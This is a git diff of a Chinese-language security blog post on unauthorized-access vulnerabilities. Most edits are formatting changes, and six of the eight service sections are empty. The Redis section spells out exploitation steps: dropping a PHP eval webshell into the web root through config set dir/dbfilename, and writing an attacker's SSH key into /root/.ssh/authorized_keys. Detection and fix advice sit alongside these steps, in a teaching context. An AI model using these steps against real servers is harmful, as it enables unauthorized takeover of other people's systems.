@@ -28,7 +28,11 @@ excerpt_separator: "常见的未授权访问漏洞："
 
 8. Rsync 未授权访问漏洞
 
+---
+
 ### 1 MongoDB 未授权访问漏洞
+
+---
 
 #### 漏洞信息
 
@@ -39,6 +43,8 @@ excerpt_separator: "常见的未授权访问漏洞："
 (3) 漏洞编号：无。
 
 (4) 影响范围：MongoDB 数据库。
+
+---
 
 #### 检测方法
 
@@ -62,6 +68,8 @@ vim /etc/mongodb.conf
 auth = true
 ```
 
+---
+
 #### 修复方法
 
 (1) 为 MongoDB 添加认证：
@@ -82,9 +90,13 @@ MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以�
 
 (3) 限制绑定 IP：
 
-启动时加入参数：`--bind_ip 127.0.0.1` ；或在 /etc/mongodb.conf 文件中添加以下内容：`bind_ip = 127.0.0.1` 。
+启动时加入参数：`--bind_ip 127.0.0.1` 或在 /etc/mongodb.conf 文件中添加以下内容：`bind_ip = 127.0.0.1` 
+
+---
 
 ### 2 Redis 未授权访问漏洞
+
+---
 
 #### 漏洞信息
 
@@ -96,11 +108,11 @@ MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以�
 
 (4) 影响范围：Redis 数据库。
 
+---
+
 #### 检测方法
 
-先用 nmap 扫描，查看端口开放情况，发现开放的 6379 端口为 Redis 的默认端口：
-
-`Nmap -A -p 6379 -script redis-info 192.168.10.153`
+先用 nmap 扫描，查看端口开放情况，发现开放的 6379 端口为 Redis 的默认端口：`Nmap -A -p 6379 -script redis-info 192.168.10.153`
 
 Nmap 扫描后发现主机的 6379 端口对外开放，可以通过 Redis 客户端进行连接，测试是否存在未授权访问漏洞，具体命令如下：
 
@@ -113,29 +125,27 @@ Info
 
 (1) 网站写码：
 
-① 先用客户端连接服务器的 redis 服务：`redis-cli.exe -h 目标IP`。
+① 先用客户端连接服务器的 redis 服务：`redis-cli.exe -h 目标IP`
 
-② 连接后设置目录：`config set dir /var/www/html（此路径是服务器端 Web 网站的目录）`。
+② 连接后设置目录：`config set dir /var/www/html（此路径是服务器端 Web 网站的目录）`
 
-③ 设置要写入的文件名：`config set dbfilename redis88.php`。
+③ 设置要写入的文件名：`config set dbfilename redis88.php`
 
-④ 设置要写入的内容：`set webshell "<?php @eval($_POST['123']); ?>"`。
+④ 设置要写入的内容：`set webshell "<?php @eval($_POST['123']); ?>"`
 
-⑤ 保存：`save`。
+⑤ 保存：`save`
 
 ⑥ 保存后用菜刀连接此木马得到 webshell。
 
 (2) 结合 SSH 免密码登录：
 
-① 先在本地建个 ssh 的密钥：`ssh-keygen-trsa`。
+① 先在本地建个 ssh 的密钥：`ssh-keygen-trsa`
 
-② 将公钥的内容写到一个文本中，命令如下：`(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt`。
+② 将公钥的内容写到一个文本中，命令如下：`(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt`
 
 注意：写到文件中时一定要在前面加几行后面加几行。
 
-③ 将里面的内容写入远程的 Redis 服务器上，并且设置其 Key 为 test，命令如下：
-
-`cat test.txt | redis -cli -h <hostname> -x set test`。
+③ 将里面的内容写入远程的 Redis 服务器上，并且设置其 Key 为 test，命令如下：`cat test.txt | redis -cli -h <hostname> -x set test`
 
 ④ 登录远程服务器，可以看到公钥已经添加到 Redis 的服务器上了，命令如下：
 
@@ -146,9 +156,11 @@ get test
 ```
 ⑤ 随后就是最关键的了，Redis 有个 save 命令：save 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照（snapshot）以 RDB 文件的形式保存到硬盘。所以，save 命令就可以将 test 里的公钥保存到 /root/.ssh 下（要有权限）。
 
-修改保存的路径为 `config set dir "/root/.ssh"`，修改文件名为 `config set dbfilename "authorized_keys"`，保存。
+修改保存的路径为 `config set dir "/root/.ssh"`修改文件名为 `config set dbfilename "authorized_keys"`保存。
 
-⑥ 测试一下：`ssh 用户名@<IP地址>`，实现免密码成功登陆。
+⑥ 测试一下：`ssh 用户名@<IP地址>`实现免密码成功登陆。
+
+---
 
 #### 修复方法
 
@@ -160,7 +172,11 @@ get test
 
 (4) 清理系统中存在的后门木马。
 
+---
+
 ### 3 Memcached 未授权访问漏洞（CVE-2013-7239）
+
+---
 
 #### 漏洞信息
 
@@ -172,16 +188,24 @@ get test
 
 (4) 影响范围：
 
+---
+
 #### 检测方法
 
 
 
+---
+
 #### 修复方法
 
 
+
+---
 
 ### 4 JBOSS 未授权访问漏洞
 
+---
+
 #### 漏洞信息
 
 (1) 漏洞简述：
@@ -192,16 +216,24 @@ get test
 
 (4) 影响范围：
 
+---
+
 #### 检测方法
 
 
 
+---
+
 #### 修复方法
 
 
+
+---
 
 ### 5 VNC 未授权访问漏洞
 
+---
+
 #### 漏洞信息
 
 (1) 漏洞简述：
@@ -212,16 +244,24 @@ get test
 
 (4) 影响范围：
 
+---
+
 #### 检测方法
 
 
 
+---
+
 #### 修复方法
 
 
+
+---
 
 ### 6 Docker 未授权访问漏洞
 
+---
+
 #### 漏洞信息
 
 (1) 漏洞简述：
@@ -232,16 +272,24 @@ get test
 
 (4) 影响范围：
 
+---
+
 #### 检测方法
 
 
 
+---
+
 #### 修复方法
 
 
+
+---
 
 ### 7 ZooKeeper 未授权访问漏洞
 
+---
+
 #### 漏洞信息
 
 (1) 漏洞简述：
@@ -252,15 +300,23 @@ get test
 
 (4) 影响范围：
 
+---
+
 #### 检测方法
 
 
+
+---
 
 #### 修复方法
 
 
 
+---
+
 ### 8 Rsync 未授权访问漏洞
+
+---
 
 #### 漏洞信息
 
@@ -272,8 +328,12 @@ get test
 
 (4) 影响范围：
 
+---
+
 #### 检测方法
 
 
+
+---
 
 #### 修复方法
